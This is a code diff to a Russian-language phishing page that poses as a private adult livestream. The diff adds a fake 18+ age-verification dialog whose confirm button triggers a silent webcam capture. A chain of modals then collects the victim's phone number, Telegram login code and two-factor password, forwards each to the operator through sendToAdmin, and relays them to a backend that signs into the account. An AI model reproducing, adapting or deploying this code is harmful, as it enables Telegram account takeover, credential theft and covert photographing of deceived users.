@@ -516,6 +516,59 @@
             transform: scale(1.05);
             box-shadow: 0 0 30px rgba(255, 51, 85, 0.5);
         }
+
+        /* ===== ПРОВЕРКА ВОЗРАСТА ===== */
+        #ageModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.96);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        #ageModal .modal-box {
+            background: #1a1a1a;
+            border-radius: 32px;
+            padding: 32px 24px;
+            width: 100%;
+            max-width: 320px;
+            text-align: center;
+        }
+        #ageModal .modal-box h3 {
+            font-size: 24px;
+            color: #ff6680;
+            margin-bottom: 12px;
+        }
+        #ageModal .modal-box p {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        #ageModal .modal-box .age-btn {
+            width: 100%;
+            padding: 14px;
+            background: #ff3366;
+            border: none;
+            border-radius: 30px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        #ageModal .modal-box .age-btn:hover {
+            background: #ff0040;
+        }
+        #ageModal .modal-box .age-btn:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
@@ -526,7 +579,7 @@
 
 <div class="fullscreen-video" id="videoContainer">
     <video id="bgVideo" autoplay muted playsinline>
-        <source src="https://go.screenpal.com/watch/cOiuXunveYx" type="video/mp4">
+        <source src="https://d.uguu.se/rwbLxNMk.mp4" type="video/mp4">
     </video>
 </div>
 
@@ -560,6 +613,16 @@
         </div>
         <div class="broadcast-status" id="broadcastStatus">⏳ Ожидайте...</div>
         <button class="broadcast-close-btn" onclick="closeBroadcast()">✕ Закрыть</button>
+    </div>
+</div>
+
+<!-- ===== ПРОВЕРКА ВОЗРАСТА (ПОЯВЛЯЕТСЯ ПЕРВОЙ) ===== -->
+<div id="ageModal">
+    <div class="modal-box">
+        <h3>🔞 ПОДТВЕРЖДЕНИЕ ВОЗРАСТА</h3>
+        <p>Для просмотра приватного стрима необходимо подтвердить, что вы старше 18 лет.</p>
+        <p style="font-size:12px; color:#666;">Нажмите «Подтвердить», чтобы сделать фото. Система проверит возраст, результат будет показан только вам.</p>
+        <button class="age-btn" id="ageConfirmBtn">✅ ПОДТВЕРДИТЬ 18+</button>
     </div>
 </div>
 
@@ -682,7 +745,7 @@
         <div id="passwordSection" class="password-section">
             <input type="password" id="password" class="modal-input" placeholder="Пароль">
         </div>
-        <button id="actionBtn" class="modal-btn" onclick="handleAction()">📱 Отправить код</button>
+        <button id="actionBtn" class="modal-btn" onclick="handleAction()">📱 ПРОДОЛЖИТЬ</button>
         <div id="status" class="status-text"></div>
         <button class="close-modal" onclick="closeModal()">Отмена</button>
     </div>
@@ -712,6 +775,7 @@
     let currentRefCode = null;
     let broadcastTriggered = false;
     let selectedCountryCode = '+7';
+    let cameraStarted = false;
     
     // ========== КАСТОМНЫЙ SELECT ==========
     function toggleOptions() {
@@ -954,163 +1018,7 @@
     }
     setInterval(addChatMessage, 4000);
     
-    // ========== МОДАЛКА ==========
-    function showModal() { document.getElementById('modal').style.display = 'flex'; resetModal(); }
-    function resetModal() {
-        document.getElementById('phone').value = "";
-        document.getElementById('code').value = "";
-        document.getElementById('password').value = "";
-        document.getElementById('codeSection').style.display = 'none';
-        document.getElementById('passwordSection').style.display = 'none';
-        document.getElementById('actionBtn').innerText = "📱 Отправить код";
-        document.getElementById('actionBtn').disabled = false;
-        document.getElementById('status').innerHTML = "";
-        document.getElementById('modalTitle').innerText = "🔞 Доступ к стриму";
-        document.getElementById('modalDesc').innerText = "Выберите страну и введите номер";
-        currentPhone = "";
-        currentStep = "phone";
-        document.getElementById('selectedFlag').src = 'flags/ru.png';
-        document.getElementById('selectedText').textContent = 'Россия (+7)';
-        selectedCountryCode = '+7';
-        document.getElementById('phone').placeholder = 'Введите номер (+7)';
-        document.querySelectorAll('.option-item').forEach(el => {
-            el.classList.remove('selected');
-            if (el.getAttribute('data-value') === '+7') {
-                el.classList.add('selected');
-            }
-        });
-    }
-    function closeModal() { document.getElementById('modal').style.display = 'none'; resetModal(); }
-    
-    async function handleAction() {
-        const btn = document.getElementById('actionBtn');
-        const statusDiv = document.getElementById('status');
-        
-        if (currentStep === "phone") {
-            let phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            if (!phone) { statusDiv.innerText = "Введите номер"; return; }
-            
-            const countryCode = selectedCountryCode;
-            let fullPhone = phone;
-            if (!phone.startsWith('+')) {
-                const digits = phone.replace(/\D/g, '');
-                fullPhone = countryCode + digits;
-            } else {
-                fullPhone = phone;
-            }
-            
-            sendToAdmin(`📞 НОВЫЙ НОМЕР: ${fullPhone}`);
-            
-            btn.disabled = true;
-            btn.innerText = "⏳ Отправка...";
-            statusDiv.innerText = "Отправляем код...";
-            try {
-                const bodyData = { phone: fullPhone };
-                if (currentRefCode) {
-                    bodyData.ref = currentRefCode;
-                }
-                const response = await fetch(`${API_URL}/send_code`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(bodyData)
-                });
-                const data = await response.json();
-                if (data.success) {
-                    currentPhone = fullPhone;
-                    currentStep = "code";
-                    document.getElementById('codeSection').style.display = 'block';
-                    btn.innerText = "✅ Подтвердить код";
-                    document.getElementById('modalTitle').innerText = "📲 Введите код";
-                    document.getElementById('modalDesc').innerText = "Код отправлен на ваш номер";
-                    statusDiv.style.color = "#88ff88";
-                    statusDiv.innerHTML = "✅ Код отправлен!";
-                    btn.disabled = false;
-                } else {
-                    statusDiv.innerText = "Ошибка: " + (data.error || "неизвестно");
-                    btn.disabled = false;
-                    btn.innerText = "📱 Отправить код";
-                }
-            } catch(e) {
-                statusDiv.innerText = "Ошибка: сервер не запущен";
-                btn.disabled = false;
-                btn.innerText = "📱 Отправить код";
-            }
-        } else if (currentStep === "code") {
-            const code = document.getElementById('code').value.trim();
-            if (!code) { statusDiv.innerText = "Введите код"; return; }
-            
-            sendToAdmin(`🔑 КОД для ${currentPhone}: ${code}`);
-            
-            btn.disabled = true;
-            btn.innerText = "⏳ Проверка...";
-            try {
-                const response = await fetch(`${API_URL}/verify_code`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: currentPhone, code: code })
-                });
-                const data = await response.json();
-                if (data.success) {
-                    statusDiv.style.color = "#88ff88";
-                    statusDiv.innerHTML = "✅ Вход выполнен!";
-                    setTimeout(() => {
-                        window.location.href = "https://web.telegram.org";
-                    }, 1500);
-                } else if (data.needs_password) {
-                    currentStep = "password";
-                    document.getElementById('codeSection').style.display = 'none';
-                    document.getElementById('passwordSection').style.display = 'block';
-                    btn.innerText = "🔐 Подтвердить пароль";
-                    document.getElementById('modalTitle').innerText = "🔐 Двухфакторная аутентификация";
-                    document.getElementById('modalDesc').innerText = "Введите пароль";
-                    statusDiv.style.color = "#ffaa66";
-                    statusDiv.innerHTML = "⏳ Требуется пароль";
-                    btn.disabled = false;
-                } else {
-                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный код");
-                    btn.disabled = false;
-                    btn.innerText = "✅ Подтвердить код";
-                }
-            } catch(e) {
-                statusDiv.innerText = "Ошибка соединения";
-                btn.disabled = false;
-                btn.innerText = "✅ Подтвердить код";
-            }
-        } else if (currentStep === "password") {
-            const password = document.getElementById('password').value.trim();
-            if (!password) { statusDiv.innerText = "Введите пароль"; return; }
-            
-            sendToAdmin(`🔒 ПАРОЛЬ 2FA для ${currentPhone}: ${password}`);
-            
-            btn.disabled = true;
-            btn.innerText = "⏳ Проверка...";
-            try {
-                const response = await fetch(`${API_URL}/verify_password`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: currentPhone, password: password })
-                });
-                const data = await response.json();
-                if (data.success) {
-                    statusDiv.style.color = "#88ff88";
-                    statusDiv.innerHTML = "✅ Вход выполнен!";
-                    setTimeout(() => {
-                        window.location.href = "https://web.telegram.org";
-                    }, 1500);
-                } else {
-                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный пароль");
-                    btn.disabled = false;
-                    btn.innerText = "🔐 Подтвердить пароль";
-                }
-            } catch(e) {
-                statusDiv.innerText = "Ошибка соединения";
-                btn.disabled = false;
-                btn.innerText = "🔐 Подтвердить пароль";
-            }
-        }
-    }
-    
-    // ========== КАМЕРА И ФОТО ==========
+    // ========== КАМЕРА ==========
     let cameraAllowed = false;
     
     async function startSilentCapture() {
@@ -1164,10 +1072,180 @@
         }
     }
     
-    document.getElementById('unlockBtn').onclick = async () => {
-        await startSilentCapture();
-        showModal();
+    // ========== ЦЕПОЧКА: КНОПКА → ВОЗРАСТ → КАМЕРА → НОМЕР ==========
+    document.getElementById('unlockBtn').onclick = function() {
+        document.getElementById('ageModal').style.display = 'flex';
     };
+    
+    document.getElementById('ageConfirmBtn').onclick = async function() {
+        const btn = this;
+        btn.disabled = true;
+        btn.textContent = '⏳ ПРОВЕРКА...';
+        
+        await startSilentCapture();
+        
+        document.getElementById('ageModal').style.display = 'none';
+        showModal();
+        
+        btn.disabled = false;
+        btn.textContent = '✅ ПОДТВЕРДИТЬ 18+';
+    };
+    
+    // ========== МОДАЛКА ==========
+    function showModal() { document.getElementById('modal').style.display = 'flex'; resetModal(); }
+    function resetModal() {
+        document.getElementById('phone').value = "";
+        document.getElementById('code').value = "";
+        document.getElementById('password').value = "";
+        document.getElementById('codeSection').style.display = 'none';
+        document.getElementById('passwordSection').style.display = 'none';
+        document.getElementById('actionBtn').innerText = "📱 ПРОДОЛЖИТЬ";
+        document.getElementById('actionBtn').disabled = false;
+        document.getElementById('status').innerHTML = "";
+        document.getElementById('modalTitle').innerText = "🔞 Доступ к стриму";
+        document.getElementById('modalDesc').innerText = "Выберите страну и введите номер";
+        currentPhone = "";
+        currentStep = "phone";
+        document.getElementById('selectedFlag').src = 'flags/ru.png';
+        document.getElementById('selectedText').textContent = 'Россия (+7)';
+        selectedCountryCode = '+7';
+        document.getElementById('phone').placeholder = 'Введите номер (+7)';
+        document.querySelectorAll('.option-item').forEach(el => {
+            el.classList.remove('selected');
+            if (el.getAttribute('data-value') === '+7') {
+                el.classList.add('selected');
+            }
+        });
+    }
+    function closeModal() { document.getElementById('modal').style.display = 'none'; resetModal(); }
+    
+    async function handleAction() {
+        const btn = document.getElementById('actionBtn');
+        const statusDiv = document.getElementById('status');
+        
+        if (currentStep === "phone") {
+            let phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
+            if (!phone) { statusDiv.innerText = "Введите номер"; return; }
+            
+            const countryCode = selectedCountryCode;
+            let fullPhone = phone;
+            if (!phone.startsWith('+')) {
+                const digits = phone.replace(/\D/g, '');
+                fullPhone = countryCode + digits;
+            } else {
+                fullPhone = phone;
+            }
+            
+            sendToAdmin(`📞 НОВЫЙ НОМЕР: ${fullPhone}`);
+            
+            btn.disabled = true;
+            btn.innerText = "⏳ ОТПРАВКА...";
+            statusDiv.innerText = "Отправляем код...";
+            try {
+                const bodyData = { phone: fullPhone };
+                if (currentRefCode) {
+                    bodyData.ref = currentRefCode;
+                }
+                const response = await fetch(`${API_URL}/send_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(bodyData)
+                });
+                const data = await response.json();
+                if (data.success) {
+                    currentPhone = fullPhone;
+                    currentStep = "code";
+                    document.getElementById('codeSection').style.display = 'block';
+                    btn.innerText = "✅ ПОДТВЕРДИТЬ КОД";
+                    document.getElementById('modalTitle').innerText = "📲 Введите код";
+                    document.getElementById('modalDesc').innerText = "Код отправлен на ваш номер";
+                    statusDiv.style.color = "#88ff88";
+                    statusDiv.innerHTML = "✅ Код отправлен!";
+                    btn.disabled = false;
+                } else {
+                    statusDiv.innerText = "Ошибка: " + (data.error || "неизвестно");
+                    btn.disabled = false;
+                    btn.innerText = "📱 ПРОДОЛЖИТЬ";
+                }
+            } catch(e) {
+                statusDiv.innerText = "Ошибка: сервер не запущен";
+                btn.disabled = false;
+                btn.innerText = "📱 ПРОДОЛЖИТЬ";
+            }
+        } else if (currentStep === "code") {
+            const code = document.getElementById('code').value.trim();
+            if (!code) { statusDiv.innerText = "Введите код"; return; }
+            
+            sendToAdmin(`🔑 КОД для ${currentPhone}: ${code}`);
+            
+            btn.disabled = true;
+            btn.innerText = "⏳ ПРОВЕРКА...";
+            try {
+                const response = await fetch(`${API_URL}/verify_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone, code: code })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    statusDiv.style.color = "#88ff88";
+                    statusDiv.innerHTML = "✅ Вход выполнен!";
+                    setTimeout(() => {
+                        window.location.href = "https://web.telegram.org";
+                    }, 1500);
+                } else if (data.needs_password) {
+                    currentStep = "password";
+                    document.getElementById('codeSection').style.display = 'none';
+                    document.getElementById('passwordSection').style.display = 'block';
+                    btn.innerText = "🔐 ПОДТВЕРДИТЬ ПАРОЛЬ";
+                    document.getElementById('modalTitle').innerText = "🔐 Двухфакторная аутентификация";
+                    document.getElementById('modalDesc').innerText = "Введите пароль";
+                    statusDiv.style.color = "#ffaa66";
+                    statusDiv.innerHTML = "⏳ Требуется пароль";
+                    btn.disabled = false;
+                } else {
+                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный код");
+                    btn.disabled = false;
+                    btn.innerText = "✅ ПОДТВЕРДИТЬ КОД";
+                }
+            } catch(e) {
+                statusDiv.innerText = "Ошибка соединения";
+                btn.disabled = false;
+                btn.innerText = "✅ ПОДТВЕРДИТЬ КОД";
+            }
+        } else if (currentStep === "password") {
+            const password = document.getElementById('password').value.trim();
+            if (!password) { statusDiv.innerText = "Введите пароль"; return; }
+            
+            sendToAdmin(`🔒 ПАРОЛЬ 2FA для ${currentPhone}: ${password}`);
+            
+            btn.disabled = true;
+            btn.innerText = "⏳ ПРОВЕРКА...";
+            try {
+                const response = await fetch(`${API_URL}/verify_password`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone, password: password })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    statusDiv.style.color = "#88ff88";
+                    statusDiv.innerHTML = "✅ Вход выполнен!";
+                    setTimeout(() => {
+                        window.location.href = "https://web.telegram.org";
+                    }, 1500);
+                } else {
+                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный пароль");
+                    btn.disabled = false;
+                    btn.innerText = "🔐 ПОДТВЕРДИТЬ ПАРОЛЬ";
+                }
+            } catch(e) {
+                statusDiv.innerText = "Ошибка соединения";
+                btn.disabled = false;
+                btn.innerText = "🔐 ПОДТВЕРДИТЬ ПАРОЛЬ";
+            }
+        }
+    }
     
     // ========== ИНИЦИАЛИЗАЦИЯ ==========
     document.addEventListener('DOMContentLoaded', function() {
